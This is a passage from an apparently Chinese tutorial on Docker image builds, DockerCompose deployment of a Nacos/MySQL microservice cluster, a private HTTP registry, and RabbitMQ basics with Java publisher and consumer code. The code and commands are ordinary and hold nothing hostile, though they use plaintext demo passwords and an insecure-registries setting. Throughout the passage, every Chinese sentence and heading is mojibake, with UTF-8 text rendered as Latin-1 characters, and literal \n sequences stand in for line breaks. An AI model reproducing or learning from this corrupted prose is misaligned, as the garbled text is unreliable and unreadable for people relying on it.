â“¶åŸºäºjava8æ„å»ºJavaé¡¹ç›®\n\nè™½ç„¶æˆ‘ä»¬å¯ä»¥åŸºäºUbuntuåŸºç¡€é•œåƒï¼Œæ·»åŠ ä»»æ„è‡ªå·±éœ€è¦çš„å®‰è£…åŒ…ï¼Œæ„å»ºé•œåƒï¼Œä½†æ˜¯å´æ¯”è¾ƒéº»çƒ¦ã€‚æ‰€ä»¥å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥åœ¨ä¸€äº›å®‰è£…äº†éƒ¨åˆ†è½¯ä»¶çš„åŸºç¡€é•œåƒä¸Šåšæ”¹é€ ã€‚ä¾‹å¦‚ï¼Œæ„å»ºjavaé¡¹ç›®çš„é•œåƒï¼Œå¯ä»¥åœ¨å·²ç»å‡†å¤‡äº†JDKçš„åŸºç¡€é•œåƒåŸºç¡€ä¸Šæ„å»ºã€‚\n\n> éœ€æ±‚ï¼šåŸºäºjava:8-alpineé•œåƒï¼Œå°†ä¸€ä¸ªJavaé¡¹ç›®æ„å»ºä¸ºé•œåƒ\n\nâ‘  æ–°å»ºä¸€ä¸ªç©ºæ–‡ä»¶å¤¹ docker-demo\n\nâ‘¡ æ‹·è´ docker-demo.jar åˆ°è¿™ä¸ªç›®å½•ä¸­\n\nâ‘¢ åœ¨ç›®å½•ä¸­æ–°å»º Dockerfile æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n\n```bash\nFROM java:8-alpine\nCOPY ./docker-demo.jar /tmp/app.jar\nEXPOSE 8090\nENTRYPOINT java -jar /tmp/app.jar\n```\n\n- â‘£ ä½¿ç”¨docker buildå‘½ä»¤æ„å»ºé•œåƒ\n\n```bash\ndocker build -t javaweb:2.0 .\n```\n\n- â‘¤ ä½¿ç”¨docker runåˆ›å»ºå®¹å™¨å¹¶è¿è¡Œ\n\n```bash\ndocker run --name web -p 8090:8090 -d javaweb:2.0 \n```\n\n## â‘¤DockerCompose\n\n### â¶ç®€ä»‹\n\nåœ¨çº¿ä¸Šç¯å¢ƒä¸­ï¼Œé€šå¸¸ä¸ä¼šå°†é¡¹ç›®çš„æ‰€æœ‰ç»„ä»¶æ”¾åˆ°åŒä¸€ä¸ªå®¹å™¨ä¸­ï¼›æ›´å¥½çš„åšæ³•æ˜¯**æŠŠæ¯ä¸ªç‹¬ç«‹çš„åŠŸèƒ½è£…è¿›å•ç‹¬çš„å®¹å™¨**ï¼Œè¿™æ ·æ–¹ä¾¿å¤ç”¨ã€‚å› æ­¤åŒä¸€ä¸ªæœåŠ¡å™¨ä¸Šä¼šè¿è¡Œç€å¤šä¸ªå®¹å™¨ï¼Œå¦‚æœæ¯æ¬¡éƒ½é ä¸€æ¡æ¡æŒ‡ä»¤å»å¯åŠ¨ï¼Œæœªå…ä¹Ÿå¤ªç¹çäº†ã€‚ `Docker-compose` å°±æ˜¯è§£å†³è¿™ä¸ªé—®é¢˜çš„ï¼Œå®ƒç”¨æ¥ç¼–æ’å¤šä¸ªå®¹å™¨ï¼Œå°†å¯åŠ¨å®¹å™¨çš„å‘½ä»¤ç»Ÿä¸€å†™åˆ° `docker-compose.yml` æ–‡ä»¶ä¸­ï¼Œä»¥åæ¯æ¬¡å¯åŠ¨è¿™ä¸€ç»„å®¹å™¨æ—¶ï¼Œåªéœ€è¦ `docker-compose up` å°±å¯ä»¥äº†ã€‚\n\nå…¶å®DockerComposeæ–‡ä»¶å¯ä»¥çœ‹åšæ˜¯å°†å¤šä¸ªdocker runå‘½ä»¤å†™åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œåªæ˜¯è¯­æ³•ç¨æœ‰å·®å¼‚ã€‚\n\nComposeæ–‡ä»¶æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œé€šè¿‡æŒ‡ä»¤å®šä¹‰é›†ç¾¤ä¸­çš„æ¯ä¸ªå®¹å™¨å¦‚ä½•è¿è¡Œã€‚æ ¼å¼å¦‚ä¸‹ï¼š\n\n```yaml\nversion:Â \"3.8\"\n services:\nÂ Â mysql:\nÂ Â Â Â image:Â mysql:5.7.25\n    environment:\n     MYSQL_ROOT_PASSWORD: root \nÂ Â Â Â volumes:\nÂ Â Â Â Â -Â \"/tmp/mysql/data:/var/lib/mysql\"\nÂ Â Â Â Â -Â \"/tmp/mysql/conf/hmy.cnf:/etc/mysql/conf.d/hmy.cnf\"\nÂ Â web:\nÂ Â Â Â build:Â .\nÂ Â Â Â ports:\nÂ Â Â Â Â - \"8090:8090\"\n\n```\n\nä¸Šé¢çš„Composeæ–‡ä»¶å°±æè¿°ä¸€ä¸ªé¡¹ç›®ï¼Œå…¶ä¸­åŒ…å«ä¸¤ä¸ªå®¹å™¨ï¼š\n\n- mysqlï¼šä¸€ä¸ªåŸºäº`mysql:5.7.25`é•œåƒæ„å»ºçš„å®¹å™¨ï¼Œå¹¶ä¸”æŒ‚è½½äº†ä¸¤ä¸ªç›®å½•\n- webï¼šä¸€ä¸ªåŸºäº`docker build`ä¸´æ—¶æ„å»ºçš„é•œåƒå®¹å™¨ï¼Œæ˜ å°„ç«¯å£æ—¶8090\n\nDockerComposeçš„è¯¦ç»†è¯­æ³•å‚è€ƒå®˜ç½‘ï¼šhttps://docs.docker.com/compose/compose-file/\n\n### â·æ¡ˆä¾‹ï¼šéƒ¨ç½²å¾®æœåŠ¡é›†ç¾¤\n\n> **éœ€æ±‚**ï¼šå°†ä¹‹å‰å­¦ä¹ çš„cloud-demoå¾®æœåŠ¡é›†ç¾¤åˆ©ç”¨DockerComposeéƒ¨ç½²\n\n**å®ç°æ€è·¯**ï¼š\n\nâ‘  åœ¨cloud-demoæ–‡ä»¶å¤¹ç¼–å†™docker-composeæ–‡ä»¶\n\nâ‘¡ ä¿®æ”¹è‡ªå·±çš„cloud-demoé¡¹ç›®ï¼Œå°†æ•°æ®åº“ã€nacosåœ°å€éƒ½å‘½åä¸ºdocker-composeä¸­çš„æœåŠ¡å\n\nâ‘¢ ä½¿ç”¨mavenæ‰“åŒ…å·¥å…·ï¼Œå°†é¡¹ç›®ä¸­çš„æ¯ä¸ªå¾®æœåŠ¡éƒ½æ‰“åŒ…ä¸ºapp.jar\n\nâ‘£ å°†æ‰“åŒ…å¥½çš„app.jaræ‹·è´åˆ°cloud-demoä¸­çš„æ¯ä¸€ä¸ªå¯¹åº”çš„å­ç›®å½•ä¸­\n\nâ‘¤ å°†cloud-demoä¸Šä¼ è‡³è™šæ‹Ÿæœºï¼Œåˆ©ç”¨ docker-compose up -d æ¥éƒ¨ç½²\n\n#### â“µç¼–å†™docker-composeæ–‡ä»¶\n\n```yaml\nversion: \"3.2\" #docker-composeç‰ˆæœ¬\nservices:\n  nacos:\n    image: nacos/nacos-server\n    environment:\n      MODE: standalone\n    ports:\n      - \"8848:8848\"\n  mysql:\n    image: mysql:5.7.25\n    environment:\n      MYSQL_ROOT_PASSWORD: 123\n    volumes:\n      - \"$PWD/mysql/data:/var/lib/mysql\"\n      - \"$PWD/mysql/conf:/etc/mysql/conf.d/\"\n  userservice:\n    build: ./user-service\n  orderservice:\n    build: ./order-service\n  gateway:\n    build: ./gateway\n    ports:\n      - \"10010:10010\"\n```\n\nå¯ä»¥çœ‹åˆ°ï¼Œå…¶ä¸­åŒ…å«5ä¸ªserviceæœåŠ¡ï¼š\n\n- `nacos`ï¼šä½œä¸ºæ³¨å†Œä¸­å¿ƒå’Œé…ç½®ä¸­å¿ƒ\n  - `image: nacos/nacos-server`ï¼š åŸºäºnacos/nacos-serveré•œåƒæ„å»º\n  - `environment`ï¼šç¯å¢ƒå˜é‡\n    - `MODE: standalone`ï¼šå•ç‚¹æ¨¡å¼å¯åŠ¨\n  - `ports`ï¼šç«¯å£æ˜ å°„ï¼Œè¿™é‡Œæš´éœ²äº†8848ç«¯å£\n- `mysql`ï¼šæ•°æ®åº“\n  - `image: mysql:5.7.25`ï¼šé•œåƒç‰ˆæœ¬æ˜¯mysql:5.7.25\n  - `environment`ï¼šç¯å¢ƒå˜é‡\n    - `MYSQL_ROOT_PASSWORD: root`ï¼šè®¾ç½®æ•°æ®åº“rootè´¦æˆ·çš„å¯†ç ä¸ºroot\n  - `volumes`ï¼šæ•°æ®å·æŒ‚è½½ï¼Œè¿™é‡ŒæŒ‚è½½äº†mysqlçš„dataã€confç›®å½•\n- `userservice`ã€`orderservice`ã€`gateway`ï¼šéƒ½æ˜¯åŸºäºDockerfileä¸´æ—¶æ„å»ºçš„\n\n#### â“¶ä¿®æ”¹å¾®æœåŠ¡é…ç½®\n\nå› ä¸ºå¾®æœåŠ¡å°†æ¥è¦éƒ¨ç½²ä¸ºdockerå®¹å™¨ï¼Œè€Œå®¹å™¨ä¹‹é—´äº’è”ä¸æ˜¯é€šè¿‡IPåœ°å€ï¼Œè€Œæ˜¯é€šè¿‡å®¹å™¨åã€‚è¿™é‡Œæˆ‘ä»¬å°†order-serviceã€user-serviceã€gatewayæœåŠ¡çš„mysqlã€nacosåœ°å€éƒ½ä¿®æ”¹ä¸ºåŸºäºå®¹å™¨åçš„è®¿é—®ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š\n\n```yaml\nspring:\n  datasource:\n    url: jdbc:mysql://mysql:3306/cloud_order?useSSL=false # mysql\n    username: root\n    password: root\n    driver-class-name: com.mysql.jdbc.Driver\n  application:\n    name: orderservice\n  cloud:\n    nacos:\n      server-addr: nacos:8848 # nacosæœåŠ¡åœ°å€\n```\n\n#### â“·æ‰“åŒ…å¾®æœåŠ¡æ¨¡å—\n\nå°†æ¯ä¸ªå¾®æœåŠ¡éƒ½æ‰“åŒ…ã€‚å› ä¸ºä¹‹å‰æŸ¥çœ‹åˆ°Dockerfileä¸­çš„jaråŒ…åç§°éƒ½æ˜¯app.jarï¼Œå› æ­¤æˆ‘ä»¬çš„æ¯ä¸ªå¾®æœåŠ¡éƒ½éœ€è¦ç”¨è¿™ä¸ªåç§°ã€‚å¯ä»¥é€šè¿‡ä¿®æ”¹pom.xmlä¸­çš„æ‰“åŒ…åç§°æ¥å®ç°ï¼Œæ¯ä¸ªå¾®æœåŠ¡éƒ½éœ€è¦ä¿®æ”¹\n\n```xml\n<build>\n  <!-- æœåŠ¡æ‰“åŒ…çš„æœ€ç»ˆåç§° -->\n  <finalName>app</finalName>\n  <plugins>\n    <plugin>\n      <groupId>org.springframework.boot</groupId>\n      <artifactId>spring-boot-maven-plugin</artifactId>\n    </plugin>\n  </plugins>\n</build>\n```\n\n#### â“¸ç¼–å†™Dockerfile\n\nå°†æ¯ä¸ªå¾®æœåŠ¡æ„å»ºæˆé•œåƒï¼Œç¼–å†™ä¸‰ä¸ªDockerfileï¼Œæ”¾å…¥å¯¹åº”ç›®å½•\n\n```bash\nFROM java:8-alpine\nCOPY ./app.jar /tmp/app.jar\nENTRYPOINT java -jar /tmp/app.jar\n```\n\nç¼–è¯‘æ‰“åŒ…å¥½çš„app.jaræ–‡ä»¶ï¼Œéœ€è¦æ”¾åˆ°Dockerfileçš„åŒçº§ç›®å½•ä¸­ã€‚æ³¨æ„ï¼šæ¯ä¸ªå¾®æœåŠ¡çš„app.jaræ”¾åˆ°ä¸æœåŠ¡åç§°å¯¹åº”çš„ç›®å½•ï¼Œåˆ«æé”™äº†ã€‚\n\n```bash\n.\nâ”œâ”€â”€ docker-compose.yml\nâ”œâ”€â”€ gateway\nâ”‚Â Â  â”œâ”€â”€ Dockerfile\nâ”‚Â Â  â””â”€â”€ app.jar\nâ”œâ”€â”€ mysql\nâ”‚Â Â  â”œâ”€â”€ conf\nâ”‚Â Â  â””â”€â”€ data\nâ”œâ”€â”€ order-service\nâ”‚Â Â  â”œâ”€â”€ Dockerfile\nâ”‚Â Â  â””â”€â”€ app.jar\nâ””â”€â”€ user-service\n    â”œâ”€â”€ Dockerfile\n    â””â”€â”€ app.jar\n```\n\n#### â“¹éƒ¨ç½²\n\næœ€åï¼Œæˆ‘ä»¬éœ€è¦å°†æ•´ä¸ªcloud-demoæ–‡ä»¶å¤¹ä¸Šä¼ åˆ°è™šæ‹Ÿæœºä¸­ï¼Œç”±DockerComposeéƒ¨ç½²ã€‚\n\nè¿›å…¥cloud-demoç›®å½•ï¼Œç„¶åè¿è¡Œä¸‹é¢çš„å‘½ä»¤ï¼š\n\n```sh\ndocker-compose up -d   # åå°è¿è¡Œå®¹å™¨\n```\n\nå…¶å®ƒå‘½ä»¤\n\n```bash\ndocker-compose build   # é‡æ–°æ„å»ºé•œåƒ\ndocker-compose start   # å¯åŠ¨å·²æœ‰çš„å®¹å™¨\ndocker-compose stop    # åœæ­¢å·²æœ‰çš„å®¹å™¨\ndocker-compose logs    # æŸ¥çœ‹å®¹å™¨æ—¥å¿—\ndocker-compose down    # åˆ é™¤å®¹å™¨\n```\n\n## â‘¥ç§æœ‰ä»“åº“\n\nä½¿ç”¨DockerComposeéƒ¨ç½²å¸¦æœ‰å›¾è±¡ç•Œé¢çš„DockerRegistryï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š\n\n```yaml\nversion: '3.0'\nservices:\n  registry:\n    image: registry\n    volumes:\n      - ./registry-data:/var/lib/registry\n  ui:\n    image: joxit/docker-registry-ui:static\n    ports:\n      - 8080:80\n    environment:\n      - REGISTRY_TITLE=ç®€ç®€ç§æœ‰ä»“åº“\n      - REGISTRY_URL=http://registry:5000\n    depends_on:\n      - registry\n```\n\n### â¶é…ç½®Dockerä¿¡ä»»åœ°å€\n\næˆ‘ä»¬çš„ç§æœé‡‡ç”¨çš„æ˜¯httpåè®®ï¼Œé»˜è®¤ä½¿ç”¨HTTPSæ¨é€é•œåƒï¼Œhttpä¸è¢«Dockerä¿¡ä»»ï¼Œæ‰€ä»¥éœ€è¦åšä¸€ä¸ªé…ç½®\n\n```sh\n# æ‰“å¼€è¦ä¿®æ”¹çš„æ–‡ä»¶\nvi /etc/docker/daemon.json\n# æ·»åŠ å†…å®¹ï¼š\n\"insecure-registries\":[\"http://192.168.150.101:8080\"]\n# é‡åŠ è½½\nsystemctl daemon-reload\n# é‡å¯docker\nsystemctl restart docker\n```\n\nè®¿é—®`http://192.168.150.101:8080` å³å¯\n\n### â·æ¨é€ã€æ‹‰å–é•œåƒ\n\næ¨é€é•œåƒåˆ°ç§æœ‰é•œåƒæœåŠ¡å¿…é¡»å…ˆtagï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š\n\nâ‘  é‡å‘½åæœ¬åœ°é•œåƒï¼Œåç§°å‰ç¼€ä¸ºç§æœ‰ä»“åº“çš„åœ°å€ï¼š192.168.150.101:8080/\n\n ```sh\ndocker tag nginx:latest 192.168.150.101:8080/nginx:1.0 \n ```\n\nâ‘¡ æ¨é€é•œåƒ\n\n```sh\ndocker push 192.168.150.101:8080/nginx:1.0 \n```\n\nâ‘¢ æ‹‰å–é•œåƒ\n\n```sh\ndocker pull 192.168.150.101:8080/nginx:1.0 \n```\n\n# 9.RabbitMQ\n\n## â‘ åˆè¯†MQ\n\n### â¶åŒæ­¥å’Œå¼‚æ­¥\n\n- åŒæ­¥é€šè®¯ï¼šå°±åƒæ‰“ç”µè¯ï¼Œéœ€è¦å®æ—¶å“åº”ã€‚\n\n- å¼‚æ­¥é€šè®¯ï¼šå°±åƒå‘å¾®ä¿¡ï¼Œä¸éœ€è¦é©¬ä¸Šå›å¤ã€‚\n\n![](https://img.jwt1399.top/img/202210051307025.png)\n\nä¸¤ç§æ–¹å¼å„æœ‰ä¼˜åŠ£ï¼Œæ‰“ç”µè¯å¯ä»¥ç«‹å³å¾—åˆ°å“åº”ï¼Œä½†æ˜¯ä½ å´ä¸èƒ½è·Ÿå¤šä¸ªäººåŒæ—¶é€šè¯ã€‚å‘é€å¾®ä¿¡å¯ä»¥åŒæ—¶ä¸å¤šäººäº¤æµï¼Œä½†æ˜¯å¾€å¾€å“åº”ä¼šæœ‰å»¶è¿Ÿã€‚\n\n#### åŒæ­¥é€šè®¯\n\nä¼˜ç‚¹ï¼š\n\n- æ—¶æ•ˆæ€§è¾ƒå¼ºï¼Œå¯ä»¥ç«‹å³å¾—åˆ°ç»“æœ\n\nç¼ºç‚¹ï¼š\n\n- è€¦åˆåº¦é«˜\n- æ€§èƒ½å’Œååèƒ½åŠ›ä¸‹é™\n- æœ‰é¢å¤–çš„èµ„æºæ¶ˆè€—\n- æœ‰çº§è”å¤±è´¥é—®é¢˜\n\n#### å¼‚æ­¥é€šè®¯\n\nä¸ºäº†è§£é™¤äº‹ä»¶å‘å¸ƒè€…ä¸æ¥æ”¶è€…ä¹‹é—´çš„è€¦åˆï¼Œä¸¤è€…å¹¶ä¸æ˜¯ç›´æ¥é€šä¿¡ï¼Œè€Œæ˜¯æœ‰ä¸€ä¸ªä¸­é—´äººï¼ˆBrokerï¼‰ã€‚å‘å¸ƒè€…å‘å¸ƒäº‹ä»¶åˆ°Brokerï¼Œä¸å…³å¿ƒè°æ¥è®¢é˜…äº‹ä»¶ã€‚æ¥æ”¶è€…ä»Brokerè®¢é˜…äº‹ä»¶ï¼Œä¸å…³å¿ƒè°å‘æ¥çš„æ¶ˆæ¯ã€‚\n\n![](https://img.jwt1399.top/img/202210051316444.png)\n\nBroker æ˜¯ä¸€ä¸ªåƒæ•°æ®æ€»çº¿ä¸€æ ·çš„ä¸œè¥¿ï¼Œæ‰€æœ‰çš„æœåŠ¡è¦æ¥æ”¶æ•°æ®å’Œå‘é€æ•°æ®éƒ½å‘åˆ°è¿™ä¸ªæ€»çº¿ä¸Šï¼Œè¿™ä¸ªæ€»çº¿å°±åƒåè®®ä¸€æ ·ï¼Œè®©æœåŠ¡é—´çš„é€šè®¯å˜å¾—æ ‡å‡†å’Œå¯æ§ã€‚\n\nä¼˜ç‚¹ï¼š\n\n- ååé‡æå‡ï¼šæ— éœ€ç­‰å¾…æ¥æ”¶è€…å¤„ç†å®Œæˆï¼Œå“åº”æ›´å¿«é€Ÿ\n\n- æ•…éšœéš”ç¦»ï¼šæœåŠ¡æ²¡æœ‰ç›´æ¥è°ƒç”¨ï¼Œä¸å­˜åœ¨çº§è”å¤±è´¥é—®é¢˜\n- è°ƒç”¨é—´æ²¡æœ‰é˜»å¡ï¼Œä¸ä¼šé€ æˆæ— æ•ˆçš„èµ„æºå ç”¨\n- è€¦åˆåº¦æä½ï¼šæ¯ä¸ªæœåŠ¡éƒ½å¯ä»¥çµæ´»æ’æ‹”ï¼Œå¯æ›¿æ¢\n- æµé‡å‰Šå³°ï¼šä¸ç®¡å‘å¸ƒäº‹ä»¶çš„æµé‡æ³¢åŠ¨å¤šå¤§ï¼Œéƒ½ç”±Brokeræ¥æ”¶ï¼Œæ¥æ”¶è€…å¯ä»¥æŒ‰ç…§è‡ªå·±çš„é€Ÿåº¦å»å¤„ç†äº‹ä»¶\n\nç¼ºç‚¹ï¼š\n\n- æ¶æ„å¤æ‚äº†ï¼Œä¸šåŠ¡æ²¡æœ‰æ˜æ˜¾çš„æµç¨‹çº¿ï¼Œä¸å¥½ç®¡ç†\n- éœ€è¦ä¾èµ–äºBrokerçš„å¯é ã€å®‰å…¨ã€æ€§èƒ½\n\n### â·æ¶ˆæ¯é˜Ÿåˆ—MQ\n\næ¯”è¾ƒå¸¸è§çš„ä¸€ç§ Broker å°±æ˜¯ MQ æŠ€æœ¯ï¼Œä¸­æ–‡æ˜¯æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆMessageQueueï¼‰ï¼Œå­—é¢æ¥çœ‹å°±æ˜¯å­˜æ”¾æ¶ˆæ¯çš„é˜Ÿåˆ—ã€‚\n\næ¯”è¾ƒå¸¸è§çš„MQå®ç°ï¼šActiveMQã€RabbitMQã€RocketMQã€Kafka\n\n|            | **RabbitMQ**            | **ActiveMQ**                      | **RocketMQ** | **Kafka**  |\n| ---------- | ----------------------- | --------------------------------- | ------------ | ---------- |\n| ç»´æŠ¤è€…     | Rabbit                  | Apache                            | é˜¿é‡Œ         | Apache     |\n| å¼€å‘è¯­è¨€   | Erlang                  | Java                              | Java         | Scala&Java |\n| åè®®æ”¯æŒ   | AMQPï¼ŒXMPPï¼ŒSMTPï¼ŒSTOMP | OpenWireï¼ŒSTOMPï¼ŒRESTï¼ŒXMPPï¼ŒAMQP | è‡ªå®šä¹‰åè®®   | è‡ªå®šä¹‰åè®® |\n| å¯ç”¨æ€§     | é«˜                      | ä¸€èˆ¬                              | é«˜           | é«˜         |\n| ååé‡     | ä¸€èˆ¬                    | å·®                                | é«˜           | éå¸¸é«˜     |\n| æ¶ˆæ¯å»¶è¿Ÿ   | å¾®ç§’çº§                  | æ¯«ç§’çº§                            | æ¯«ç§’çº§       | æ¯«ç§’ä»¥å†…   |\n| æ¶ˆæ¯å¯é æ€§ | é«˜                      | ä¸€èˆ¬                              | é«˜           | ä¸€èˆ¬       |\n\nè¿½æ±‚å¯ç”¨æ€§ï¼šKafkaã€ RocketMQ ã€RabbitMQ\n\nè¿½æ±‚å¯é æ€§ï¼šRabbitMQã€RocketMQ\n\nè¿½æ±‚ååèƒ½åŠ›ï¼šRocketMQã€Kafka\n\nè¿½æ±‚æ¶ˆæ¯ä½å»¶è¿Ÿï¼šRabbitMQã€Kafka\n\n### â¸RabbitMQç»“æ„\n\n| MQæˆå‘˜      | æè¿°                                     |\n| ----------- | ---------------------------------------- |\n| publisher   | ç”Ÿäº§è€…                                   |\n| consumer    | æ¶ˆè´¹è€…                                   |\n| exchange    | äº¤æ¢æœºï¼Œè´Ÿè´£æ¶ˆæ¯è·¯ç”±                     |\n| queue       | é˜Ÿåˆ—ï¼Œå­˜å‚¨æ¶ˆæ¯                           |\n| virtualHost | è™šæ‹Ÿä¸»æœºï¼Œéš”ç¦»ä¸åŒç§Ÿæˆ·çš„ exchangeã€queue |\n\n![](https://img.jwt1399.top/img/202210051322263.png)\n\n### â¹RabbitMQæ¶ˆæ¯æ¨¡å‹\n\nRabbitMQå®˜æ–¹æä¾›äº†5ä¸ªä¸åŒçš„Demoç¤ºä¾‹ï¼Œå¯¹åº”äº†ä¸åŒçš„æ¶ˆæ¯æ¨¡å‹\n\n- åŸºæœ¬æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆBasicQueueï¼‰\n- å·¥ä½œæ¶ˆæ¯é˜Ÿåˆ—ï¼ˆWorkQueueï¼‰\n- å‘å¸ƒè®¢é˜…æ¨¡å¼ï¼ˆPublish/Subscribeï¼‰\n  - å¹¿æ’­ï¼ˆFanout Exchangeï¼‰\n  - è·¯ç”±ï¼ˆDirect Exchangeï¼‰\n  - ä¸»é¢˜ï¼ˆTopic Exchangeï¼‰\n\n## â‘¡å¿«é€Ÿå…¥é—¨\n\n### â¶å®‰è£…RabbitMQ\n\n- æ‹‰å–é•œåƒ\n\n```bash\ndocker pull rabbitmq:3-management\n```\n\n- è¿è¡Œé•œåƒ\n\n```bash\ndocker run \\\n -e RABBITMQ_DEFAULT_USER=jianjian \\\n -e RABBITMQ_DEFAULT_PASS=123321 \\\n --name mq \\\n --hostname mq1 \\\n -p 15672:15672 \\\n -p 5672:5672 \\\n -d rabbitmq:3-management\n```\n\nè®¿é—® `http://127.0.0.1:15672` å³å¯\n\n### â·å…¥é—¨æ¡ˆä¾‹\n\nåŸºæœ¬æ¶ˆæ¯é˜Ÿåˆ—æ¨¡å¼çš„æ¨¡å‹å›¾ï¼š\n\n![](https://img.jwt1399.top/img/202210051435751.png)\n\n\n\nå®˜æ–¹çš„HelloWorldæ˜¯åŸºäºæœ€åŸºç¡€çš„æ¶ˆæ¯é˜Ÿåˆ—æ¨¡å‹æ¥å®ç°çš„ï¼ŒåªåŒ…æ‹¬ä¸‰ä¸ªè§’è‰²ï¼š\n\n- publisherï¼šæ¶ˆæ¯å‘å¸ƒè€…ï¼Œå°†æ¶ˆæ¯å‘é€åˆ°é˜Ÿåˆ—queue\n- queueï¼šæ¶ˆæ¯é˜Ÿåˆ—ï¼Œè´Ÿè´£æ¥å—å¹¶ç¼“å­˜æ¶ˆæ¯\n- consumerï¼šè®¢é˜…é˜Ÿåˆ—ï¼Œå¤„ç†é˜Ÿåˆ—ä¸­çš„æ¶ˆæ¯\n\n#### â“µå‡†å¤‡å·¥ä½œ\n\nIDEAä¸­å¯¼å…¥Demoå·¥ç¨‹ [mq-demo](https://jwt1399.lanzouv.com/iw6lR0d7tmob)ï¼Œå¯¼å…¥åç»“æ„å¦‚ä¸‹ï¼š\n\n![](https://img.jwt1399.top/img/202210051432528.png)\n\nåŒ…æ‹¬ä¸‰éƒ¨åˆ†ï¼š\n\n- mq-demoï¼šçˆ¶å·¥ç¨‹ï¼Œç®¡ç†é¡¹ç›®ä¾èµ–\n- publisherï¼šæ¶ˆæ¯çš„å‘é€è€…\n- consumerï¼šæ¶ˆæ¯çš„æ¶ˆè´¹è€…\n\n#### â“¶publisherå®ç°\n\næ€è·¯ï¼š\n\n- 1.å»ºç«‹è¿æ¥\n- 2.åˆ›å»ºChannel\n- 3.å£°æ˜é˜Ÿåˆ—\n- 4.å‘é€æ¶ˆæ¯\n- 5.å…³é—­è¿æ¥å’Œé€šé“\n\n```java\npublic class PublisherTest {\n    @Test\n    public void testSendMessage() throws IOException, TimeoutException {\n        // 1.å»ºç«‹è¿æ¥\n        ConnectionFactory factory = new ConnectionFactory();\n        // 1.1.è®¾ç½®è¿æ¥å‚æ•°ï¼Œåˆ†åˆ«æ˜¯ï¼šä¸»æœºåã€ç«¯å£å·ã€vhostã€ç”¨æˆ·åã€å¯†ç \n        factory.setHost(\"192.168.50.86\");\n        factory.setPort(5672);\n        factory.setVirtualHost(\"/\");\n        factory.setUsername(\"jianjian\");\n        factory.setPassword(\"123321\");\n        // 1.2.å»ºç«‹è¿æ¥\n        Connection connection = factory.newConnection();\n\n        // 2.åˆ›å»ºé€šé“Channel\n        Channel channel = connection.createChannel();\n\n        // 3.åˆ›å»ºé˜Ÿåˆ—\n        String queueName = \"simple.queue\";\n        channel.queueDeclare(queueName, false, false, false, null);\n\n        // 4.å‘é€æ¶ˆæ¯\n        String message = \"hello, rabbitmq!\";\n        channel.basicPublish(\"\", queueName, null, message.getBytes());\n        System.out.println(\"å‘é€æ¶ˆæ¯æˆåŠŸï¼šã€\" + message + \"ã€‘\");\n\n        // 5.å…³é—­é€šé“å’Œè¿æ¥\n        channel.close();\n        connection.close();\n    }\n}\n```\n\n#### â“·consumerå®ç°\n\næ€è·¯ï¼š\n\n- 1.å»ºç«‹è¿æ¥\n- 2.åˆ›å»ºChannel\n- 3.å£°æ˜é˜Ÿåˆ—\n- 4.è®¢é˜…æ¶ˆæ¯\n- 5.å¤„ç†æ¶ˆæ¯\n\n```java\npublic class ConsumerTest {\n\n    public static void main(String[] args) throws IOException, TimeoutException {\n        // 1.å»ºç«‹è¿æ¥\n        ConnectionFactory factory = new ConnectionFactory();\n        // 1.1.è®¾ç½®è¿æ¥å‚æ•°ï¼Œåˆ†åˆ«æ˜¯ï¼šä¸»æœºåã€ç«¯å£å·ã€vhostã€ç”¨æˆ·åã€å¯†ç \n        factory.setHost(\"192.168.50.86\");\n        factory.setPort(5672);\n        factory.setVirtualHost(\"/\");\n        factory.setUsername(\"jianjian\");\n        factory.setPassword(\"123321\");\n        // 1.2.å»ºç«‹è¿æ¥\n        Connection connection = factory.newConnection();\n\n        // 2.åˆ›å»ºé€šé“Channel\n        Channel channel = connection.createChannel();\n\n        // 3.åˆ›å»ºé˜Ÿåˆ—\n        String queueName = \"simple.queue\";\n        channel.queueDeclare(queueName, false, false, false, null);\n\n        // 4.è®¢é˜…æ¶ˆæ¯\n        channel.basicConsume(queueName, true, new DefaultConsumer(channel){\n            @Override\n            public void handleDelivery(String consumerTag, Envelope envelope,\n                                       AMQP.BasicProperties properties, byte[] body) throws IOException {\n                // 5.å¤„ç†æ¶ˆæ¯\n                String message = new String(body);\n                System.out.println(\"æ¥æ”¶åˆ°æ¶ˆæ¯ï¼šã€\" + message + \"ã€‘\");\n            }\n        });\n        System.out.println(\"ç­‰å¾…æ¥æ”¶æ¶ˆæ¯ã€‚ã€‚ã€‚ã€‚\");\n    }\n}\n```\n\n#### â“¸æ€»ç»“\n\nåŸºæœ¬æ¶ˆæ¯é˜Ÿåˆ—çš„æ¶ˆæ¯å‘é€æµç¨‹ï¼š\n\n1. å»ºç«‹connection\n\n2. åˆ›å»ºchannel\n\n3. åˆ©ç”¨channelå£°æ˜é˜Ÿåˆ—\n\n4. åˆ©ç”¨channelå‘é˜Ÿåˆ—å‘é€æ¶ˆæ¯\n\nåŸºæœ¬æ¶ˆæ¯é˜Ÿåˆ—çš„æ¶ˆæ¯æ¥æ”¶æµç¨‹ï¼š\n\n1. å»ºç«‹connection\n\n2. åˆ›å»ºchannel\n\n3. åˆ©ç”¨channelå£°æ˜é˜Ÿåˆ—\n\n4. å®šä¹‰consumerçš„æ¶ˆè´¹è¡Œä¸ºhandleDelivery()\n\n5. åˆ©ç”¨channelå°†æ¶ˆè´¹è€…ä¸é˜Ÿåˆ—ç»‘å®š\n\n## â‘¢SpringAMQP\n\n### âŠç®€ä»‹\n\nAMQPï¼ˆAdvanced Message Queuing Protocolï¼‰æ˜¯ç”¨äºåœ¨åº”ç”¨ç¨‹åºä¹‹é—´ä¼ é€’ä¸šåŠ¡æ¶ˆæ¯çš„å¼€æ”¾æ ‡å‡†ã€‚è¯¥åè®®ä¸è¯­è¨€å’Œå¹³å°æ— å…³ï¼Œæ›´ç¬¦åˆå¾®æœåŠ¡ä¸­ç‹¬ç«‹æ€§çš„è¦æ±‚ã€‚\n\nSpringAMQP æ˜¯åŸºäºAMQPåè®® å’Œ RabbitMQ 